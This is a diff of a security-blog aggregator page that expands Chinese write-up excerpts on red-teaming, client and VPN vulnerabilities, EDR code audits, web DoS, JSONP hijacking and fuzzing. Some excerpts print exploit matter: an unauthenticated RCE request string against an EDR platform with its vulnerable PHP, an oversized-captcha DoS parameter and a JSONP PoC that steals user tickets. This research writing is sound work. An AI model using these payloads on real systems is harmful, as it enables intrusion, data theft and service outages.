@@ -106,7 +106,7 @@
           <br>
           <h3>BugBounty & Research ＠RSS</h3>
           学无止尽<br>
-          最近更新：<time class="js-relative-time" datetime="2024-09-26T01:11:10.091Z">2024-09-26T01:11:10.091Z</time>
+          最近更新：<time class="js-relative-time" datetime="2024-09-27T01:11:52.518Z">2024-09-27T01:11:52.518Z</time>
           <br>
           <ul>
               <section class="day-container">
@@ -120,7 +120,7 @@
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2024-06-30T11:08:00.000Z">2024-06-30T11:08:00.000Z</time></span> |
                           <span>预计阅读时间: <time>8 min</time></span> |
-                          <span>字数: <time>2478</time></span>
+                          <span>字数: <time>2487</time></span>
                         </b>
                       </div>
                       <p>0# 概述哈哈，各位师傅好久不见啦，最近比较忙，抽空将本文写出来~说到信息搜集，一般大家都会联想到Web外部打点的暴露面信息搜集。但在内网渗透的过程中，信息搜集也是决定成败的决定性因素特别是做持...</p>
@@ -140,7 +140,7 @@
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2024-02-19T02:39:00.000Z">2024-02-19T02:39:00.000Z</time></span> |
                           <span>预计阅读时间: <time>2 min</time></span> |
-                          <span>字数: <time>711</time></span>
+                          <span>字数: <time>706</time></span>
                         </b>
                       </div>
                       <p>0# 概述注：本文原创首发自T00ls论坛，文章链接：https://www.t00ls.com/thread-71282-1-1.html最近刷了刷公众号，偶然看到吾爱破解论坛官方公众号发布了...</p>
@@ -253,7 +253,7 @@
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2024-01-01T06:57:17.000Z">2024-01-01T06:57:17.000Z</time></span> |
                           <span>预计阅读时间: <time>2 min</time></span> |
-                          <span>字数: <time>642</time></span>
+                          <span>字数: <time>634</time></span>
                         </b>
                       </div>
                       <p>1# 概述今天是2024年的第一天，很高兴能再次和大家见面，我是渊龙Sec安全团队的创始人——曾哥 @AabyssZG。首先，在这个日子里面祝各位师傅元旦快乐，在新的一年里面：事业如虎添翼，财运...</p>
@@ -276,7 +276,32 @@
                           <span>字数: <time>301</time></span>
                         </b>
                       </div>
-                      <p>客户端应用漏洞是许多人在进行漏洞挖掘和安全测试时容易忽视的领域。随着技术的更迭和攻防手段的升级，客户端应用漏洞也逐渐出现在大众视野中（APT攻击、攻防赛事等等），在本次议题中，我们将重点关注PC侧的客户端应用程序，如即时通讯、远程服务、视频软件等应用，探索其中存在的漏洞和潜在的安全风险。</p>
+                      <p>被忽视的暗面：客户端应用漏洞挖掘之旅
+前言
+在2023年12月15日，我有幸参加了由“字节跳动安全中心”举办的“安全范儿”沙龙活动。作为“中孚信息元亨实验室”的一员，我被邀请分享名为“被忽视的暗面：客户端应用漏洞挖掘之旅”的技术议题。
+客户端应用漏洞是许多人在进行漏洞挖掘和安全测试时容易忽视的领域。随着技术的更迭和攻防手段的升级，客户端应用漏洞也逐渐出现在大众视野中（APT攻击、攻防赛事等等），在本次议题中，我们将重点关注PC侧的客户端应用程序，如即时通讯、远程服务、视频软件等应用，探索其中存在的漏洞和潜在的安全风险。
+
+漏洞案例
+漏洞案例的分析主要分为两类，一是常规风险的介绍和了解，二是RCE漏洞的挖掘思路和手法。
+注意：以下漏洞案例均通过脱敏和细节上的处理。
+常规风险篇
+常规风险在这里我分为这几类：信息泄露、白利用、逻辑校验、缓冲区溢出。
+信息泄漏
+对于客户端的信息泄露，我一开始采用的方式就是基于IDA Strings进行敏感的字符串信息匹配，将HaE的规则转为Yara规则再通过FindCrypt3插件进行匹配。
+
+实际效果没有那么好，仅有一些数据库的连接配置信息泄露，并且由于是基于IDA的也没有那么好的进行自动批量化发现。
+
+
+我们可以借助Strings工具来快速的获取可执行文件的字符串内容，并通过正则或其他方式进行匹配。
+
+白利用
+白利用问题就老生常谈了，在红队的工作中也经常遇到，如DLL文件没有经过比对导致的劫持问题、带有签名的程序可以通过参数的方式执行任意命令。因此在这里就不过多的赘述了。
+
+
+逻辑校验
+很多客户端程序在对用户信息进行获取的时候会通过内存的方式，来获取用户的编号，从而基于此进一步来获取用户的信息。然而这种方式并不是完全可信的，我们可以通过CE来对内存进行修改，从而导致越权漏洞的产生。
+
+这类问题很经典，在以往就有许多案例（wooyun-2015-…</p>
                       </details>
                       <hr>
                     </article>
@@ -293,7 +318,7 @@
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2023-12-14T02:39:00.000Z">2023-12-14T02:39:00.000Z</time></span> |
                           <span>预计阅读时间: <time>2 min</time></span> |
-                          <span>字数: <time>733</time></span>
+                          <span>字数: <time>740</time></span>
                         </b>
                       </div>
                       <p>1# 概述不知不觉，个人博客已经开办了一年了回头看一年前的自己，仍有些感触，遂在闲暇时光提笔写下一些碎碎念数了数我在这一年发表过的博客文章，共计约二十余篇，其实我是真没想到能有那么多文章，比我原...</p>
@@ -354,7 +379,7 @@ FlightRecorder存在于Jdk 11+，具体类名：jdk.management.jfr.FlightRecorde
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2023-11-25T06:59:00.000Z">2023-11-25T06:59:00.000Z</time></span> |
                           <span>预计阅读时间: <time>3 min</time></span> |
-                          <span>字数: <time>875</time></span>
+                          <span>字数: <time>868</time></span>
                         </b>
                       </div>
                       <p>0# 概述最近反正也没啥事情干，突然看到朋友 青山ya 师傅审计出了腾讯开源的xSRC系统的逻辑漏洞，于是我就没事干，把开源的xSRC源码拉下来跟着审计了一波但在审计的过程中，我在TSRC（腾讯...</p>
@@ -394,7 +419,7 @@ FlightRecorder存在于Jdk 11+，具体类名：jdk.management.jfr.FlightRecorde
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2023-10-21T04:25:00.000Z">2023-10-21T04:25:00.000Z</time></span> |
                           <span>预计阅读时间: <time>5 min</time></span> |
-                          <span>字数: <time>1625</time></span>
+                          <span>字数: <time>1620</time></span>
                         </b>
                       </div>
                       <p>如果你要参加AWD相关比赛，相信本项目能给你带来帮助~手册版本号：V1.2.2-2023/10/21这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容如果你...</p>
@@ -414,7 +439,7 @@ FlightRecorder存在于Jdk 11+，具体类名：jdk.management.jfr.FlightRecorde
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2023-10-01T03:02:00.000Z">2023-10-01T03:02:00.000Z</time></span> |
                           <span>预计阅读时间: <time>3 min</time></span> |
-                          <span>字数: <time>795</time></span>
+                          <span>字数: <time>789</time></span>
                         </b>
                       </div>
                       <p>0# 概述最近一段时间项目也比较多，再加上最近还在维护开源项目，所以挺忙的。乘着国庆时间，好好放松一下，顺便借着国庆期间更新一下自己许久未更新的博客哈哈~本篇文章，我们将深入学习著名BurpSu...</p>
@@ -474,7 +499,7 @@ FlightRecorder存在于Jdk 11+，具体类名：jdk.management.jfr.FlightRecorde
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2023-09-01T06:04:00.000Z">2023-09-01T06:04:00.000Z</time></span> |
                           <span>预计阅读时间: <time>2 min</time></span> |
-                          <span>字数: <time>657</time></span>
+                          <span>字数: <time>669</time></span>
                         </b>
                       </div>
                       <p>前言今年很巧，8月23日项目结束后，24号2023成都CCS网络安全大会就召开了。我今年刚好在武汉做项目，想了想，结束直接一个飞机飞往成都，开启了本次成都安全之旅。成都的师傅们都很热情，也结识了...</p>
@@ -534,7 +559,7 @@ FlightRecorder存在于Jdk 11+，具体类名：jdk.management.jfr.FlightRecorde
                           <span><a href=https://blog.zgsec.cn/>AabyssZG&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2023-07-17T10:15:00.000Z">2023-07-17T10:15:00.000Z</time></span> |
                           <span>预计阅读时间: <time>3 min</time></span> |
-                          <span>字数: <time>927</time></span>
+                          <span>字数: <time>922</time></span>
                         </b>
                       </div>
                       <p>0# 概述在日常的渗透过程中，总会碰到一些RCE漏洞，无回显的RCE漏洞更是家常便饭。对于无回显的漏洞利用，网上有不少文章，但我看了半天，都是Linux系统的当无回显RCE漏洞碰上Win服务器，...</p>
@@ -840,7 +865,34 @@ Recon The Trailblazer challenge provided exactly one page to the site and no sou
                           <span>字数: <time>125</time></span>
                         </b>
                       </div>
-                      <p>我眼中的红队</p>
+                      <p>我眼中的红队
+碎语闲谈，作为一名多年的十八线红队选手一直想写一篇文章来总结下“我眼中的红队”，之前写过一点，因文笔拙劣遂删除，起本文重写。
+什么是红队
+现如今是数字化时代，万物联网创造了一个新的空间，即网络空间，网络空间的安全也上升到了国家安全层面，并且网络已经成为国家继海、陆、空、天之后的第五大主权领域空间。
+正是如此，网络空间也就如传统领域空间一样，需要通过演习对抗的模式，提升网络安全防御能力，以攻促防，知攻善防。
+攻防双方在演习中通常称之为红队（Red Team）和蓝队（Blue Team），红队（Red Team）即攻击方，穷尽方法攻击以达到获取演习靶标权限的目的。
+红队攻击流程
+红队的攻击流程大致分为4个步骤，分别是制定战术、外网打点、内网横向、结果报告。
+制定战术：根据演习规则及目标结合自身优点制定攻击战术，以保证演习过程不盲目、不混乱，有条不紊的完成演习；
+外网打点：通过漏洞、供应链、社工、近源等手段对目标暴露面进行攻击，以此打开进入目标内网的入口；
+内网横向：通过信息收集、分析、关联，结合相关漏洞及密码对内网可达网段机器进行横向攻击，以此发现更多脆弱点或接近内网的演习靶标；
+结果报告：将红队攻击过程、所涉技术手段、攻击痕迹等信息进行整理，形成文档提交至演习平台，并且便于后续复盘。
+红队成员结构
+通常在攻防演习中，主办方都是要求现场红队成员有三位，按照我的理解这三位应该是：队长、渗透师、横向师。
+队长：技术综合能力较强，具备较好的团队协作、组织、应变、沟通能力，能有条理的安排演习任务，并且在演习结果上报后有争议时与裁判进行沟通；
+渗透师：前渗透能力较强，也就是侧重于信息收集、Web漏洞黑盒挖掘及代码审计能力，在拿到目标信息后能够快速的找到脆弱资产，撕开暴露面入口以供后渗透；
+横向师：后渗透能力较强，也就是侧重于木马免杀、权限维持及漏洞利用能力，当具有暴露面入口时能够通过它对内网进行持续性的脆弱点发现。
+当然，目标往往是美好的，现实却是残酷的，在演习中真正的红队成员都应该具备这三种能力，才能应对这万变的局面。
+红队基础设施
+红队的基础设施，我将其分为三大块：人员、武器库、漏洞库。
+人员：万事皆以人为本，红队的基础设施也离不开人，优秀的伙伴可以让你在演习过程中更舒心，而人员通常是最难解决的，大部分都是通过外部招聘的形式引入技术人才，或培养初入职场的学生；
+武器库：武器库在我的理解中，就是一切皆自动化或自主化，信息收集、邮件钓鱼、木马免杀的自动化，以及C2、Webshell管理工具的自主化，这都是最基础的一些；
+漏洞库：漏洞库即0day、1day这些漏洞的利用，例如SQL注入不应只是注入，而是要结合SQL注入直接获取目标站点权限，无论你是结合SQL注入获取密码再进入后台进行文件上传获取权限，还是SQL注入直接堆叠执行命令获取权限，简而言之，漏洞只是开始，通过漏洞获取权限才是漏洞库所需要的，这也是大家通常所说的漏洞武器化。
+红队结果复盘
+在进行一场演习之后，红队应结合演习结果进行复盘，主要围绕这几个方面：演习结果的总结、红队成员的分工、演习过程的问题。
+演习结果的总结：对演习上报的结果进行总结，梳理出攻击技术及相关路径；
+红队成员的分工：明确每个成员的分工，并且结合成果来看分工的落实程度；
+演习过程的问题：总结演习过程中发现的问题，找出问题产生的原因，有解决方案的提出解决方案，没有的就复盘会上进行交流。</p>
                       </details>
                       <hr>
                     </article>
@@ -1137,7 +1189,31 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>454</time></span>
                         </b>
                       </div>
-                      <p>某VPN客户端远程下载文件执行模拟逆向分析</p>
+                      <p>某VPN客户端远程下载文件执行模拟逆向分析
+前言
+2021年3月，我通过黑盒的方式挖掘出某VPN客户端的远程下载文件执行漏洞，其原理就是通过VPN客户端本身所开启的Web服务API接口修改客户端更新请求地址，继而通过API控制客户端程序进行自动请求更新，导致客户端下载我自定义的更新程序，并运行。
+黑盒侧的漏洞挖掘往往带有许多的不确定性，所以我尝试从白盒（逆向）侧的角度去入手分析该漏洞的形成，并以此为基础形成对这种漏洞的模型记忆，并且在后续的研究中也用类似思路对其他VPN客户端进行漏洞挖掘，成果还算不错。
+注：文中可能会存在笔误或描述不准确等错误，还望各位不吝赐教，多多斧正。
+黑盒侧
+在正式逆向之前，建议读者先阅读一下黑盒侧的漏洞挖掘过程，如若读者已经熟知该漏洞，可越过该章节直接阅读「逆向侧」章节内容。
+漏洞回顾
+随便找一个地方下载VPN客户端下载安装。
+安装完之后访问VPN的页面，发现VPN会自动下载组件更新：
+
+这之间也许是因为存在着某些联系，可以深入的看一下。
+对本地的访问
+重现上述问题，通过F12发现当访问VPN的登陆页面会对本地127.0.0.1进行HTTP(s)请求：
+
+这些请求均为GET请求并附带着一些参数，我把它一一列下来：
+
+本地来看一下这个54530端口对应的进程是什么：
+
+发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置：
+
+确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对127.0.0.1的访问从而引起VPN进行组件更新。
+更新地址可控
+通过以上的分析可以猜测整个大致流程，但我设想一下如果我可以控制本地的更新指向我的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我可以拿到安装VPN客户端的使用者PC权限。
+再回到之前的本地链接列表，根据对英文的理解，参数…</p>
                       </details>
                       <hr>
                     </article>
@@ -1157,7 +1233,34 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>273</time></span>
                         </b>
                       </div>
-                      <p>记一次攻防演习渗透过程</p>
+                      <p>记一次攻防演习渗透过程
+前言
+记录一次攻防演习渗透过程，文章仅写关于「打点」环节的部分，也就是拿到靶标的Webshell为止。
+任务: 拿到XXX业务系统权限…
+过程
+靶标是一个www的域名，简单看了下有机会硬啃（商业源码），但时间不多，先找找脆弱点，常规一套流程，收集子域、C段…
+脆弱点发现
+在对子域的常规扫描后，发现存在.git泄露:
+
+以及发现了phpMyAdmin应用和一些phpinfo()信息泄漏:
+
+看到这些，不由得兴奋了起来，接下来只要按照预期的想法: 通过.git拿到数据库账号密码（源码中一般会有），登录phpMyAdmin，然后拿到Webshell…
+但…转折点来了，尝试使用GitHack等一系列常见工具去恢复.git，发现恢复的文件只有一些图片，看Logs发现有很多文件恢复失败，既然不能当一个ScriptKid一把梭哈，那就自己来手动恢复吧~
+Git原理与恢复
+基本概念
+Git有三个概念词需要了解: 1.工作区 2.版本库 3.暂存区
+工作区就是正常的目录（你的项目位置）;版本库就是在工作区内的一个隐藏目录.git;如果你曾经注意过这个目录你会发现里面有许多东西，在该目录下会存在一个index文件，这被称之为暂存区。
+除以上所述之外，大家都知道每一个Git项目都会有一个默认的分支master，在.git目录下有一个文件head，它用来指向master这个分支。
+
+当我们使用git add时，实际上就是把文件添加进暂存区；使用git commit时，才会把暂存区的内容添加到当前分支，默认是master分支。
+我们可以来实际的看一下index和head这两个文件:
+
+使用Binwalk直接分析，可以很直观的看见index内有许多内容，head并没有，直接cat head发现这就是一个单纯的文本内容:
+
+ref: refs/heads/master
+
+
+前面了…</p>
                       </details>
                       <hr>
                     </article>
@@ -1197,7 +1300,41 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>1147</time></span>
                         </b>
                       </div>
-                      <p>某终端检测响应平台代码审计挖掘（RCE）</p>
+                      <p>某终端检测响应平台代码审计挖掘（RCE）
+前言
+继上一次对某终端检测响应平台权限绕过漏洞的审计流程，现分享对该平台进行代码审计后挖掘到的远程命令执行漏洞。
+上篇文章其实采用的是通读代码逻辑的方法进行漏洞挖掘，那么本次我们使用敏感函数回溯的方法（代码审计方法通常分为三类: 通读全文、敏感函数参数回溯、定向功能分析）来进行漏洞挖掘。
+审计流程
+定位敏感函数
+前文说到，不是一把梭的0day都不叫0day，所以我们可以对命令执行、代码执行等漏洞相关敏感函数进行全文搜索，敏感函数列表如下 :
+
+exec()
+passthru()
+proc_open()
+shell_exec()
+system()
+popen()
+eval() //非函数
+assert()
+preg_replace()
+
+
+搜索关键词 exec(，发现一处文件 /ldb/dc.php 自定义了命令执行代码，函数体是调用的 exec 函数 :
+
+/**
+ * 执行外部程序
+ * @param string $command 执行命令
+ * @param array  $output  输出信息
+ * @param int    $ret     返回值
+ * @return string 返回执行结果
+ */
+function ldb_exec($command, &amp;$output, &amp;$ret) {
+    if (!ldb_is_linux()) {
+        $data &#x3D; exec($command, $output, $ret);
+    } else {
+        pcntl_signal(SIGCHLD, SIG_DFL);
+        $data &#x3D; exec($command, $output, $ret);
+        pcntl_signal(SIGCHLD, SIG_IGN);…</p>
                       </details>
                       <hr>
                     </article>
@@ -1210,7 +1347,54 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>704</time></span>
                         </b>
                       </div>
-                      <p>某终端检测响应平台代码审计挖掘（权限绕过）</p>
+                      <p>某终端检测响应平台代码审计挖掘（权限绕过）
+前言
+前几天收到某终端检测响应平台代码未授权RCE的漏洞情报，基本上被师傅们玩的差不多了，基于其他社群传出的源代码进行代码审计挖掘。
+本文不会对太多细节进行描述，仅做一个流程分析和梳理，文中若有不当之处还望各位师傅斧正。
+审计流程
+其源代码的大致目录如下：
+
+.
+├── cascade
+├── dbint64_to_array.php
+├── dbstr_to_int64.php
+├── diskio
+├── get_auth.php
+├── heart_aware.php
+├── kill.exe
+├── lang
+├── ldb
+├── ldb.js
+├── ldb_collect.php
+├── ldb_daemon.php
+├── ldb_manage.php
+├── ldb_mapreduce.php
+├── ldb_master.php
+├── ldb_rest.php
+├── ldb_rfs.php
+├── ldb_stream.php
+├── license
+├── link_log_second_convert.php
+├── locks
+├── manage
+├── mapreduce
+├── mdb
+├── mdb.ini
+├── mdb_console.php
+├── mdb_server.php
+├── misc
+├── modify_detect_engine_config.php
+├── mongo
+├── mongo.exe
+├── mongo_config
+├── mongod
+├── mongodump
+├── mongoexport
+├── mongoexport.exe
+├── mongoimport
+├── mongoimport.exe
+├── mongorestore
+├── nets…</p>
                       </details>
                       <hr>
                     </article>
@@ -1223,7 +1407,40 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>295</time></span>
                         </b>
                       </div>
-                      <p>某终端检测响应平台代码审计分析</p>
+                      <p>某终端检测响应平台代码审计分析
+前言
+2020年08月17日收到一条漏洞情报，某终端检测响应平台代码未授权RCE：/tool/log/c.php?strip_slashes&#x3D;system&amp;host&#x3D;id
+
+参数：host，可以修改任意的系统命令进行执行。
+原理分析
+首先我们跟进一下/tool/log/c.php文件发现其没有任何权限限制，所以我们只需要看一下请求参数是如何传递的，搜索关键词：
+
+$_POST
+$_GET
+$_REQUEST
+
+
+在代码第144行、146行分别调用了变量匿名函数，并将$_REQUEST作为传递参数：
+
+$show_form($_REQUEST);
+...
+$main($_REQUEST);
+
+
+先跟进$show_form这个匿名函数：
+
+$show_form &#x3D; function($params) use(&amp;$strip_slashes, &amp;$show_input) {
+    extract($params);
+    $host  &#x3D; isset($host)  ? $strip_slashes($host)  : &quot;127.0.0.1&quot;;
+    $path  &#x3D; isset($path)  ? $strip_slashes($path)  : &quot;&quot;;
+    $row   &#x3D; isset($row)   ? $strip_slashes($row)   : &quot;&quot;;
+    $limit &#x3D; isset($limit) ? $strip_slashes($limit) : 1000;
+    
+    // 绘制表单
+    echo &quot;
+&quot;;
+    echo &#x27;&#x27;;
+    $show_input(array(&quot;ti…</p>
                       </details>
                       <hr>
                     </article>
@@ -1236,7 +1453,21 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>296</time></span>
                         </b>
                       </div>
-                      <p>浅谈蓝队反制手段</p>
+                      <p>浅谈蓝队反制手段
+前言
+网络安全攻防演习在国内已经逐渐常态化，从行业、区域（省份、地市）到部级…
+2020年1月份开始到现在可以说基本上每个月都有1-3场HW，红与蓝的对抗从未停息。
+红队的攻击技巧可以无穷无尽（扫描器、社工、0day、近源…），但是对于蓝队防守来说除了演习中常规的封IP、下线业务、看日志分析流量等“纯防守”操作以外，似乎实在是没有什么其他的防御手段了。
+笔者在参与的几场攻防演习项目中担任“蓝队防守”角色，就发现了这一缺陷，似乎安全防御基础较弱的厂商再怎么充足的进行演习前准备，都只有乖乖的等待被“收割”。
+转换一个思维，化被动为主动，尝试用“攻击”思路代入“防守”中，对“红队”进行反向捕获（反制）。
+本文将总结案例和“反制”手段，文中不足之处还望各位斧正。
+反制手段
+蜜罐篇
+蜜罐设备
+大部分厂商为了争取得到一些分数，都会采购/借用一些厂商的蜜罐设备，但蜜罐也分两类：传统、现代，两者从本质上还是有一定区别的，这里我简单说一下自己的理解。
+传统蜜罐：蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的防御能力。
+现代蜜罐：除了捕获分析攻击行为外，各类安全厂商在蜜罐产品中加入了“攻击者画像”这一功能作为“卖点”，而本质上攻击者画像是将第三方厂商漏洞转为画像探针，利用第三方厂商漏洞获取攻击者所在此类厂商网站业务上的个人信息，此类漏洞多半为前端类漏洞，例如：JSONP、XSS…除此之外还有网站伪造、自动投放蜜标等等众多丰富的功能。
+所以传统蜜罐厂商在这一块的被“需要”不大，而现代蜜罐厂商在这一块往往有需要性很多，就冲“攻击者画像”这一方面在演习…</p>
                       </details>
                       <hr>
                     </article>
@@ -1276,7 +1507,26 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>360</time></span>
                         </b>
                       </div>
-                      <p>Web层面上的那些拒绝服务攻击(DoS)</p>
+                      <p>Web层面上的那些拒绝服务攻击(DoS)
+声明
+由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，Vulkey_Chen(戴城)不为此承担任何责任。
+Vulkey_Chen(戴城)拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。
+未经Vulkey_Chen(戴城)允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。
+本文所需一定基础知识方能顺畅的进行阅读和理解，基础知识请读者自行搜索学习。
+前言
+相信很多师傅都了解DDoS攻击，也就是分布式拒绝服务，但这类攻击在很多时候拼的是资源，从攻击者的角度来看进行此类攻击还是需要一定“成本”的，从受害者的角度来看防御此类攻击的“成本”更是昂贵！
+拒绝服务是一个老生常谈的话题，而发生在Web层面的拒绝服务风险一直不被重视；虽然其不如RCE、SQLi之类的漏洞更加直接的影响数据和服务，但令服务器宕机这类风险还是不容小视。
+试想如果攻击者去利用不费成本的Web层拒绝服务风险造成服务器、应用、模块…瘫痪宕机，岂不是令那些斥巨资建设/购买“DDoS防护”一脸懵～
+原理及案例
+资源生成大小可控
+现在有许多资源是由服务器生成然后返回给客户端的，而此类“资源生成”接口如若有参数可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风险。
+此类场景多为：图片验证码、二维码
+实际场景
+图片验证码在登录、注册、找回密码…等功能比较常见：
+
+关注一下接口地址：https://attack/validcode?w&#x3D;130&amp;h&#x3D;53
+参数值：w&#x3D;130&amp;h&#x3D;53，我们可以理解为生成的验证码大小长为130，宽为53
+可以将w&#x3D;130修改为w&#x3D;130000000000000000，让服务器生成超大的图片验证码从而占用服务器资源造成拒绝服务。…</p>
                       </details>
                       <hr>
                     </article>
@@ -1296,7 +1546,76 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>163</time></span>
                         </b>
                       </div>
-                      <p>[XSSI]动态JS劫持用户信息</p>
+                      <p>动态JS劫持用户信息
+Webpack+JSONP劫持
+作者：key
+注：本文已对敏感信息脱敏化，如有雷同纯属巧合。
+前言
+在做测试的时候发现一个请求：
+
+POST /user/getUserInfo HTTP/1.1
+Host: xxxxx
+Cookie: xxxx
+
+ticket&#x3D;xxxxx
+
+
+其对应返回的信息包含了我本身用户的敏感信息：手机号、姓名、邮箱…
+通过BurpSuite的插件Logger++搜索发现该ticket值居然出现在了JS文件中：
+
+确定漏洞
+通过测试我发现以上所述请求中的Cookie为无效请求头，后端不对齐校验，但对ticket校验，也就说明此处的ticket代表了获取用户信息的关键参数，换种说法：当你知道用户的ticket参数即可获取该用户信息。
+判断JS动静态
+当我在Logger++插件搜索到ticket值存在JS文件内容时，我的第一想法就是这个JS文件为动态类型，其文件内容跟随用户凭证字段的变化而变化。
+测试：删除Cookie字段，结果：ticket参数值消失，由此可以判断该JS内容为动态类型。
+再尝试将测试账户A的Cookie字段内容替换为测试账户B的Cookie字段内容，结果：ticket参数值变为测试账户B用户的对应值，由此可以判断该JS文件路径是固定的，并不是动态路径。
+Webpack+JSONP劫持
+已知JS文件路径为：https://website/app.xxxxx.js
+查看其文件内容发现其被Webpack打包过：
+
+那么我们想要劫持这个JS文件内容其实就可以使用JSONP的PoC代码（因为这段JS文件内容就是自定义函数+传入参数）：
+
+
+function webpackJsonp(data) {
+	alert(data)
+}
+
+
+
+
+但这样得不到我们想要的ticket值，简单的看了下JS代码，这段JS代码内容的格式是这样的：
+webpackJsonp 函数传入两个参数：第一个参数毫无用处，第二个参数传入的值包含了我们想要的ticket值。
+那以上代码就可以这样修改：
+
+
+function webpackJsonp(data, data1) {
+	alert(data1)
+}
+
+
+
+
+但我们还是没得到我们想要的信息：
+
+因为第二段参数传入的值还需要进行解析，我发现这段值内容就是一段JSON对象，而对象的每个属性都在定义一个函数：
+
+寻找ticket所在函数位置，发现其在jbTV: function...内，知道了所在函数位置，PoC代码只需要这样进行构建：
+
+
+function webpackJsonp(data, data1) {
+	alert(data1[&#x27;jbTV&#x27;])
+}
+
+
+
+
+访问，成功获取：
+
+后面只需要稍微的加个正则就可以了～
+攻击方式
+用户登录状态，访问该漏洞页面，触发即可获取到ticket值，将该值带入以上所列请求中即可越权获取用户信息
+结尾
+心细一点，漏洞就在眼前，</p>
                       </details>
                       <hr>
                     </article>
@@ -1309,7 +1628,46 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>136</time></span>
                         </b>
                       </div>
-                      <p>利用SourceMap还原网站原始代码(前端)</p>
+                      <p>利用SourceMap还原网站原始代码(前端)
+作者：key
+说明
+现在越来越多网站使用前后端分离技术，利用Webpack技术将JS类拓展语言进行打包，当然很多都是配套使用，例如Vue（前端Javascript框架）+Webpack技术；
+这种技术也在普及，并且转向常态化，对渗透测试人员来说极其不友好：
+1.增加了前端代码阅读的时间（可读性很差）
+2.由原因1间接造成了前端漏洞的审计困难性
+但是也具备一定的好处：
+1.采用这种模式，后端接口将完全暴露在JS文件中
+除此之外，如果生成了Source Map文件可以利用该文件还原网站原始前端代码（关于技术名词的具体含义请自行查询百科）
+主流浏览器都自带解析Source Map文件功能（开发者工具-Sources【火狐下是调试器】）：
+
+展开可以看见具体文件和代码：
+
+但是文件过多的情况下，单个查看繁琐，不便于搜索（浏览器的开发者工具支持全局文件搜索，但搜索速度较慢），使用restore-source-tree可以解决这一问题。
+restore-source-tree 安装
+原作者的有BUG，使用国外友人修复后的版本：https://github.com/laysent/restore-source-tree，安装步骤如下：
+
+git clone https://github.com/laysent/restore-source-tree
+cd restore-source-tree
+sudo npm install -g
+
+
+Source Map文件还原
+在这类JS文件下通常会有一个注释：
+
+
+map文件就是js文件所在目录下，拼接URL即可访问，将其下载下来：
+wget http://hostname/static/js/app.fedfe85b2fdd8cf29dc7.js.map
+restore-source-tree进行还原：
+
+# -o 参数是指定输出目录，若不适用则为默认的output目录
+restore-source-tree app.fedfe85b2fdd8cf29dc7.js.map
+
+
+
+成功获得原代码：
+
+Reference
+https://yukaii.tw/blog/2017/02/21/restore-source-code-from-sourcemap-file/</p>
                       </details>
                       <hr>
                     </article>
@@ -1329,7 +1687,37 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>180</time></span>
                         </b>
                       </div>
-                      <p>WebFuzzing方法和漏洞案例总结</p>
+                      <p>WebFuzzing方法和漏洞案例总结
+作者：Vulkey_Chen
+博客：gh0st.cn
+背景
+之前有幸做过一次线下的议题分享《我的Web应用安全模糊测试之路》，讲解了一些常用的WebFuzzing技巧和案例，该议题得到了很大的回响，很多师傅们也与我进行了交流，但考虑到之前分享过很多思路非常不全面，这里以本篇文章作为一次总结，以实战引出技巧思路（方法）。
+我的Web应用安全模糊测试之路议题解读：https://gh0st.cn/archives/2018-07-25/1 （推荐阅读）
+实战案例
+以下分享的案例都是个人在参与项目或私密众测邀请时遇见的真实案例，案例大多基于个人收集和整理的FuzzDict项目（字典库）。
+
+其中涉及的一些漏洞可能无法作为Fuzzing归类，这里也进行了强行的归类，只是想告诉大家漏洞挖掘中思路发散的重要性，个人也觉得比较经典。
+注： 漏洞案例进行了脱敏以及细节上的修改。
+案例-Add
+[SQLi注入漏洞]
+1.获得项目子域：https://xxx.com
+2.目录扫描发现/user/目录，二层探测发现/register接口，其意为：“注册”
+
+3.根据返回状态信息去Fuzz用户名、密码参数-&gt;结果：uname\pwd
+4.对uname参数进行SQL注入测试，简单的逻辑判断存在
+5.注入点使用16进制的方式无法注入，SQLmap参数--no-escape即可绕过
+
+[拒绝服务]图片验证码
